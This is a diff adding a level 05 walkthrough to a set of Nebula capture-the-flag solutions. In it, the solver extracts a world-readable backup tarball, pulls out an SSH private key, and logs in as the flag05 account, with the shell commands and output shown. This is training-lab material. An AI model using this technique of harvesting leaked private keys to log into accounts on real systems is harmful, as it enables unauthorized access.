@@ -5,6 +5,47 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 05
+--------
+
+##### inspect /home/flag05 permissions
+```bash
+level05@nebula:~$ ll /home/flag05/.backup/
+total 2
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 ./
+drwxr-x--- 1 flag05 level05   80 2016-08-19 20:42 ../
+-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
+```
+
+##### untar archive and use ssh private key to connect with flag05 user and getflag
+```bash
+level05@nebula:~$ tar -xvzf /home/flag05/.backup/backup-19072011.tgz
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+
+level05@nebula:~$ ssh nebula -l flag05
+The authenticity of host 'nebula (127.0.1.1)' can't be established.
+ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'nebula' (ECDSA) to the list of known hosts.
+  
+      _   __     __          __     
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ / 
+  /_/ |_/\___/_.___/\__,_/_/\__,_/  
+                                    
+...
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+...
+
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
+
+
 level 06
 --------
 
